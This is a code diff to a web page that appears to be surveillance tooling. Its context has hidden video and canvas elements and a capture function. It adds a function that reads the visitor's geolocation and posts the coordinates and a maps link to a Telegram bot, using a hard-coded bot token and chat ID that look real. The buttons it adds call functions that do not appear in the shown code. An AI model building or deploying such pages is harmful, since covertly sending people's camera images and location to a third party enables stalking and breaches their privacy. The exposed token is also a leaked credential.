@@ -6,6 +6,15 @@
 <video id="video" autoplay playsinline width="320" style="display:none;"></video>
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
+<button onclick="getLocation()">Get Location</button>
+<button onclick="startTracking()">Start Live Tracking</button>
+<button onclick="stopTracking()">Stop Tracking</button>
+
+<p id="coords"></p>
+<a id="mapsLink" target="_blank"></a>
+
+<div id="map"></div>
+
 <script>
 const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
 const CHAT_ID = "8504837303";
@@ -36,6 +45,35 @@ function capture(){
  });
 
 }
+const botToken = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE"
+const chatId = "8504837303"
+
+function sendLocation(){
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+let lat = pos.coords.latitude
+let lon = pos.coords.longitude
+
+let text = `📍 Location\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`
+
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chatId,
+text:text
+})
+})
+
+document.getElementById("status").innerHTML="Location sent!"
+
+})
+
+}
+
 </script>
 
 </body>
